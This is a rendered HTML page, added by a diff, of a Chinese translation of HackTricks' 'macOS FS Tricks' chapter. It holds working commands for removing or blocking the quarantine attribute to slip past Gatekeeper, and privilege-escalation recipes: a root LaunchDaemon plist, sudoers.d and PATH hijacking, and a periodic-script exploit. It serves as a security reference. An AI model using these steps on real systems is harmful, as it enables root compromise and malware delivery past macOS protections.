@@ -1,0 +1,551 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>macOS FS Tricks</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="macos-fs-tricks"><a class="header" href="#macos-fs-tricks">macOS FS Tricks</a></h1>
+<p>{% hint style="success" %}
+Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="posix-权限组合"><a class="header" href="#posix-权限组合">POSIX 权限组合</a></h2>
+<p><strong>目录</strong>中的权限：</p>
+<ul>
+<li><strong>读取</strong> - 你可以<strong>枚举</strong>目录条目</li>
+<li><strong>写入</strong> - 你可以<strong>删除/写入</strong>目录中的<strong>文件</strong>，并且可以<strong>删除空文件夹</strong>。</li>
+<li>但你<strong>不能删除/修改非空文件夹</strong>，除非你对其拥有写入权限。</li>
+<li>你<strong>不能修改文件夹的名称</strong>，除非你拥有它。</li>
+<li><strong>执行</strong> - 你被<strong>允许遍历</strong>目录 - 如果你没有这个权限，你将无法访问其中的任何文件或任何子目录。</li>
+</ul>
+<h3 id="危险组合"><a class="header" href="#危险组合">危险组合</a></h3>
+<p><strong>如何覆盖一个由 root 拥有的文件/文件夹</strong>，但：</p>
+<ul>
+<li>路径中的一个父<strong>目录所有者</strong>是用户</li>
+<li>路径中的一个父<strong>目录所有者</strong>是具有<strong>写入权限</strong>的<strong>用户组</strong></li>
+<li>一个用户<strong>组</strong>对<strong>文件</strong>具有<strong>写入</strong>权限</li>
+</ul>
+<p>在任何上述组合中，攻击者可以<strong>注入</strong>一个<strong>符号/硬链接</strong>到预期路径，以获得特权的任意写入。</p>
+<h3 id="文件夹-root-rx-特殊情况"><a class="header" href="#文件夹-root-rx-特殊情况">文件夹 root R+X 特殊情况</a></h3>
+<p>如果在一个<strong>目录</strong>中，<strong>只有 root 拥有 R+X 访问权限</strong>，那么这些文件对<strong>其他任何人都不可访问</strong>。因此，允许将一个用户可读的<strong>文件</strong>（由于该<strong>限制</strong>而无法读取）从此文件夹<strong>移动到另一个文件夹</strong>的漏洞，可能被滥用以读取这些文件。</p>
+<p>示例在：<a href="https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions">https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions</a></p>
+<h2 id="符号链接--硬链接"><a class="header" href="#符号链接--硬链接">符号链接 / 硬链接</a></h2>
+<p>如果一个特权进程正在写入一个<strong>文件</strong>，该文件可能被<strong>低权限用户控制</strong>，或者可能是<strong>之前由低权限用户创建</strong>的。用户可以通过符号链接或硬链接<strong>指向另一个文件</strong>，特权进程将写入该文件。</p>
+<p>查看其他部分，攻击者可能会<strong>滥用任意写入以提升权限</strong>。</p>
+<h2 id="fileloc"><a class="header" href="#fileloc">.fileloc</a></h2>
+<p>具有**<code>.fileloc</code>** 扩展名的文件可以指向其他应用程序或二进制文件，因此当它们被打开时，将执行该应用程序/二进制文件。<br />
+示例：</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+&lt;key&gt;URL&lt;/key&gt;
+&lt;string&gt;file:///System/Applications/Calculator.app&lt;/string&gt;
+&lt;key&gt;URLPrefix&lt;/key&gt;
+&lt;integer&gt;0&lt;/integer&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre>
+<h2 id="arbitrary-fd"><a class="header" href="#arbitrary-fd">Arbitrary FD</a></h2>
+<p>如果你能让一个 <strong>进程以高权限打开一个文件或文件夹</strong>，你可以利用 <strong><code>crontab</code></strong> 以 <strong><code>EDITOR=exploit.py</code></strong> 打开 <code>/etc/sudoers.d</code> 中的一个文件，这样 <code>exploit.py</code> 将获得对 <code>/etc/sudoers</code> 中文件的 FD 并加以利用。</p>
+<p>例如: <a href="https://youtu.be/f1HA5QhLQ7Y?t=21098">https://youtu.be/f1HA5QhLQ7Y?t=21098</a></p>
+<h2 id="avoid-quarantine-xattrs-tricks"><a class="header" href="#avoid-quarantine-xattrs-tricks">Avoid quarantine xattrs tricks</a></h2>
+<h3 id="remove-it"><a class="header" href="#remove-it">Remove it</a></h3>
+<pre><code class="language-bash">xattr -d com.apple.quarantine /path/to/file_or_app
+</code></pre>
+<h3 id="uchg--uchange--uimmutable-标志"><a class="header" href="#uchg--uchange--uimmutable-标志">uchg / uchange / uimmutable 标志</a></h3>
+<p>如果一个文件/文件夹具有此不可变属性，则无法在其上放置 xattr。</p>
+<pre><code class="language-bash">echo asd &gt; /tmp/asd
+chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
+xattr -w com.apple.quarantine "" /tmp/asd
+xattr: [Errno 1] Operation not permitted: '/tmp/asd'
+
+ls -lO /tmp/asd
+# check the "uchg" in the output
+</code></pre>
+<h3 id="defvfs-mount"><a class="header" href="#defvfs-mount">defvfs mount</a></h3>
+<p>一个 <strong>devfs</strong> 挂载 <strong>不支持 xattr</strong>，更多信息请参见 <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html"><strong>CVE-2023-32364</strong></a></p>
+<pre><code class="language-bash">mkdir /tmp/mnt
+mount_devfs -o noowners none "/tmp/mnt"
+chmod 777 /tmp/mnt
+mkdir /tmp/mnt/lol
+xattr -w com.apple.quarantine "" /tmp/mnt/lol
+xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
+</code></pre>
+<h3 id="writeextattr-acl"><a class="header" href="#writeextattr-acl">writeextattr ACL</a></h3>
+<p>此 ACL 防止向文件添加 <code>xattrs</code></p>
+<pre><code class="language-bash">rm -rf /tmp/test*
+echo test &gt;/tmp/test
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
+ls -le /tmp/test
+ditto -c -k test test.zip
+# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
+
+cd /tmp
+echo y | rm test
+
+# Decompress it with ditto
+ditto -x -k --rsrc test.zip .
+ls -le /tmp/test
+
+# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
+open test.zip
+sleep 1
+ls -le /tmp/test
+</code></pre>
+<h3 id="comappleacltext-xattr--appledouble"><a class="header" href="#comappleacltext-xattr--appledouble"><strong>com.apple.acl.text xattr + AppleDouble</strong></a></h3>
+<p><strong>AppleDouble</strong> 文件格式复制一个文件及其 ACE。</p>
+<p>在 <a href="https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html"><strong>源代码</strong></a> 中可以看到，存储在名为 <strong><code>com.apple.acl.text</code></strong> 的 xattr 中的 ACL 文本表示将被设置为解压缩文件中的 ACL。因此，如果你将一个应用程序压缩成一个带有 ACL 的 <strong>AppleDouble</strong> 文件格式的 zip 文件，该 ACL 阻止其他 xattrs 被写入... 那么隔离 xattr 并没有被设置到应用程序中：</p>
+<p>查看 <a href="https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/"><strong>原始报告</strong></a> 获取更多信息。</p>
+<p>要复制这个，我们首先需要获取正确的 acl 字符串：</p>
+<pre><code class="language-bash"># Everything will be happening here
+mkdir /tmp/temp_xattrs
+cd /tmp/temp_xattrs
+
+# Create a folder and a file with the acls and xattr
+mkdir del
+mkdir del/test_fold
+echo test &gt; del/test_fold/test_file
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
+ditto -c -k del test.zip
+
+# uncomporess to get it back
+ditto -x -k --rsrc test.zip .
+ls -le test
+</code></pre>
+<p>(Note that even if this works the sandbox write the quarantine xattr before)</p>
+<p>不是真的需要，但我留着以防万一：</p>
+<p>{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
+<a href="macos-xattr-acls-extra-stuff.html">macos-xattr-acls-extra-stuff.md</a>
+{% endcontent-ref %}</p>
+<h2 id="绕过代码签名"><a class="header" href="#绕过代码签名">绕过代码签名</a></h2>
+<p>Bundles 包含文件 <strong><code>_CodeSignature/CodeResources</code></strong>，其中包含每个 <strong>file</strong> 在 <strong>bundle</strong> 中的 <strong>hash</strong>。请注意，CodeResources 的 hash 也 <strong>嵌入在可执行文件中</strong>，因此我们也不能对其进行修改。</p>
+<p>然而，有一些文件的签名不会被检查，这些文件在 plist 中具有 omit 键，例如：</p>
+<pre><code class="language-xml">&lt;dict&gt;
+...
+&lt;key&gt;rules&lt;/key&gt;
+&lt;dict&gt;
+...
+&lt;key&gt;^Resources/.*\.lproj/locversion.plist$&lt;/key&gt;
+&lt;dict&gt;
+&lt;key&gt;omit&lt;/key&gt;
+&lt;true/&gt;
+&lt;key&gt;weight&lt;/key&gt;
+&lt;real&gt;1100&lt;/real&gt;
+&lt;/dict&gt;
+...
+&lt;/dict&gt;
+&lt;key&gt;rules2&lt;/key&gt;
+...
+&lt;key&gt;^(.*/)?\.DS_Store$&lt;/key&gt;
+&lt;dict&gt;
+&lt;key&gt;omit&lt;/key&gt;
+&lt;true/&gt;
+&lt;key&gt;weight&lt;/key&gt;
+&lt;real&gt;2000&lt;/real&gt;
+&lt;/dict&gt;
+...
+&lt;key&gt;^PkgInfo$&lt;/key&gt;
+&lt;dict&gt;
+&lt;key&gt;omit&lt;/key&gt;
+&lt;true/&gt;
+&lt;key&gt;weight&lt;/key&gt;
+&lt;real&gt;20&lt;/real&gt;
+&lt;/dict&gt;
+...
+&lt;key&gt;^Resources/.*\.lproj/locversion.plist$&lt;/key&gt;
+&lt;dict&gt;
+&lt;key&gt;omit&lt;/key&gt;
+&lt;true/&gt;
+&lt;key&gt;weight&lt;/key&gt;
+&lt;real&gt;1100&lt;/real&gt;
+&lt;/dict&gt;
+...
+&lt;/dict&gt;
+</code></pre>
+<p>可以通过命令行计算资源的签名：</p>
+<p>{% code overflow="wrap" %}</p>
+<pre><code class="language-bash">openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
+</code></pre>
+<p>{% endcode %}</p>
+<h2 id="挂载-dmgs"><a class="header" href="#挂载-dmgs">挂载 dmgs</a></h2>
+<p>用户可以挂载一个自定义的 dmg，即使是在某些现有文件夹上。这就是您如何创建一个包含自定义内容的自定义 dmg 包：</p>
+<p>{% code overflow="wrap" %}</p>
+<pre><code class="language-bash"># Create the volume
+hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1&gt;/dev/null
+mkdir /private/tmp/mnt
+
+# Mount it
+hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1&gt;/dev/null
+
+# Add custom content to the volume
+mkdir /private/tmp/mnt/custom_folder
+echo "hello" &gt; /private/tmp/mnt/custom_folder/custom_file
+
+# Detach it
+hdiutil detach /private/tmp/mnt 1&gt;/dev/null
+
+# Next time you mount it, it will have the custom content you wrote
+
+# You can also create a dmg from an app using:
+hdiutil create -srcfolder justsome.app justsome.dmg
+</code></pre>
+<p>{% endcode %}</p>
+<p>通常，macOS通过与<code>com.apple.DiskArbitrarion.diskarbitrariond</code> Mach服务（由<code>/usr/libexec/diskarbitrationd</code>提供）进行通信来挂载磁盘。如果在LaunchDaemons plist文件中添加参数<code>-d</code>并重启，它将把日志存储在<code>/var/log/diskarbitrationd.log</code>中。<br />
+然而，可以使用像<code>hdik</code>和<code>hdiutil</code>这样的工具直接与<code>com.apple.driver.DiskImages</code> kext进行通信。</p>
+<h2 id="任意写入"><a class="header" href="#任意写入">任意写入</a></h2>
+<h3 id="定期sh脚本"><a class="header" href="#定期sh脚本">定期sh脚本</a></h3>
+<p>如果您的脚本可以被解释为<strong>shell脚本</strong>，您可以覆盖**<code>/etc/periodic/daily/999.local</code>** shell脚本，该脚本将每天触发。</p>
+<p>您可以用以下命令<strong>伪造</strong>此脚本的执行：<strong><code>sudo periodic daily</code></strong></p>
+<h3 id="守护进程"><a class="header" href="#守护进程">守护进程</a></h3>
+<p>编写一个任意的<strong>LaunchDaemon</strong>，如**<code>/Library/LaunchDaemons/xyz.hacktricks.privesc.plist</code>**，其中plist执行一个任意脚本，如：</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+&lt;key&gt;Label&lt;/key&gt;
+&lt;string&gt;com.sample.Load&lt;/string&gt;
+&lt;key&gt;ProgramArguments&lt;/key&gt;
+&lt;array&gt;
+&lt;string&gt;/Applications/Scripts/privesc.sh&lt;/string&gt;
+&lt;/array&gt;
+&lt;key&gt;RunAtLoad&lt;/key&gt;
+&lt;true/&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre>
+<p>Just generate the script <code>/Applications/Scripts/privesc.sh</code> with the <strong>commands</strong> you would like to run as root.</p>
+<h3 id="sudoers-file"><a class="header" href="#sudoers-file">Sudoers File</a></h3>
+<p>如果你有 <strong>任意写入</strong> 权限，你可以在 <strong><code>/etc/sudoers.d/</code></strong> 文件夹内创建一个文件，授予自己 <strong>sudo</strong> 权限。</p>
+<h3 id="path-files"><a class="header" href="#path-files">PATH files</a></h3>
+<p>文件 <strong><code>/etc/paths</code></strong> 是填充 PATH 环境变量的主要位置之一。你必须是 root 才能覆盖它，但如果 <strong>特权进程</strong> 执行某个 <strong>命令而没有完整路径</strong>，你可能能够通过修改此文件来 <strong>劫持</strong> 它。</p>
+<p>你也可以在 <strong><code>/etc/paths.d</code></strong> 中写入文件，以将新文件夹加载到 <code>PATH</code> 环境变量中。</p>
+<h2 id="生成其他用户可写的文件"><a class="header" href="#生成其他用户可写的文件">生成其他用户可写的文件</a></h2>
+<p>这将生成一个属于 root 的文件，我可以写入（<a href="https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh"><strong>代码来自这里</strong></a>）。这也可能作为提权工作：</p>
+<pre><code class="language-bash">DIRNAME=/usr/local/etc/periodic/daily
+
+mkdir -p "$DIRNAME"
+chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"
+
+MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername
+
+FILENAME=$(ls "$DIRNAME")
+echo $FILENAME
+</code></pre>
+<h2 id="posix-共享内存"><a class="header" href="#posix-共享内存">POSIX 共享内存</a></h2>
+<p><strong>POSIX 共享内存</strong> 允许在 POSIX 兼容操作系统中的进程访问一个公共内存区域，与其他进程间通信方法相比，促进了更快的通信。它涉及使用 <code>shm_open()</code> 创建或打开一个共享内存对象，使用 <code>ftruncate()</code> 设置其大小，并使用 <code>mmap()</code> 将其映射到进程的地址空间。进程可以直接从这个内存区域读取和写入。为了管理并发访问并防止数据损坏，通常使用互斥锁或信号量等同步机制。最后，进程使用 <code>munmap()</code> 和 <code>close()</code> 解除映射并关闭共享内存，并可选择使用 <code>shm_unlink()</code> 删除内存对象。该系统在多个进程需要快速访问共享数据的环境中，尤其有效于高效、快速的 IPC。</p>
+<details>
+<summary>生产者代码示例</summary>
+```c
+// gcc producer.c -o producer -lrt
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+<p>int main() {
+const char *name = "/my_shared_memory";
+const int SIZE = 4096; // Size of the shared memory object</p>
+<p>// Create the shared memory object
+int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
+if (shm_fd == -1) {
+perror("shm_open");
+return EXIT_FAILURE;
+}</p>
+<p>// Configure the size of the shared memory object
+if (ftruncate(shm_fd, SIZE) == -1) {
+perror("ftruncate");
+return EXIT_FAILURE;
+}</p>
+<p>// Memory map the shared memory
+void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
+if (ptr == MAP_FAILED) {
+perror("mmap");
+return EXIT_FAILURE;
+}</p>
+<p>// Write to the shared memory
+sprintf(ptr, "Hello from Producer!");</p>
+<p>// Unmap and close, but do not unlink
+munmap(ptr, SIZE);
+close(shm_fd);</p>
+<p>return 0;
+}</p>
+<pre><code>&lt;/details&gt;
+
+&lt;details&gt;
+
+&lt;summary&gt;消费者代码示例&lt;/summary&gt;
+```c
+// gcc consumer.c -o consumer -lrt
+#include &lt;fcntl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+const char *name = "/my_shared_memory";
+const int SIZE = 4096; // Size of the shared memory object
+
+// Open the shared memory object
+int shm_fd = shm_open(name, O_RDONLY, 0666);
+if (shm_fd == -1) {
+perror("shm_open");
+return EXIT_FAILURE;
+}
+
+// Memory map the shared memory
+void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
+if (ptr == MAP_FAILED) {
+perror("mmap");
+return EXIT_FAILURE;
+}
+
+// Read from the shared memory
+printf("Consumer received: %s\n", (char *)ptr);
+
+// Cleanup
+munmap(ptr, SIZE);
+close(shm_fd);
+shm_unlink(name); // Optionally unlink
+
+return 0;
+}
+
+</code></pre>
+</details>
+<h2 id="macos-受保护描述符"><a class="header" href="#macos-受保护描述符">macOS 受保护描述符</a></h2>
+<p><strong>macOS 受保护描述符</strong> 是在 macOS 中引入的一项安全功能，旨在增强用户应用程序中 <strong>文件描述符操作</strong> 的安全性和可靠性。这些受保护的描述符提供了一种将特定限制或“保护”与文件描述符关联的方法，这些限制由内核强制执行。</p>
+<p>此功能特别有助于防止某些类别的安全漏洞，例如 <strong>未经授权的文件访问</strong> 或 <strong>竞争条件</strong>。这些漏洞发生在例如一个线程正在访问一个文件描述符，导致 <strong>另一个易受攻击的线程对其访问</strong>，或者当一个文件描述符被 <strong>继承</strong> 给一个易受攻击的子进程时。与此功能相关的一些函数包括：</p>
+<ul>
+<li><code>guarded_open_np</code>: 以保护方式打开文件描述符</li>
+<li><code>guarded_close_np</code>: 关闭它</li>
+<li><code>change_fdguard_np</code>: 更改描述符上的保护标志（甚至移除保护）</li>
+</ul>
+<h2 id="参考资料"><a class="header" href="#参考资料">参考资料</a></h2>
+<ul>
+<li><a href="https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/">https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/</a></li>
+</ul>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-code-signing.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-fs-tricks/macos-xattr-acls-extra-stuff.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-code-signing.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-fs-tricks/macos-xattr-acls-extra-stuff.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../../elasticlunr.min.js"></script>
+        <script src="../../../../mark.min.js"></script>
+        <script src="../../../../searcher.js"></script>
+
+        <script src="../../../../clipboard.min.js"></script>
+        <script src="../../../../highlight.js"></script>
+        <script src="../../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
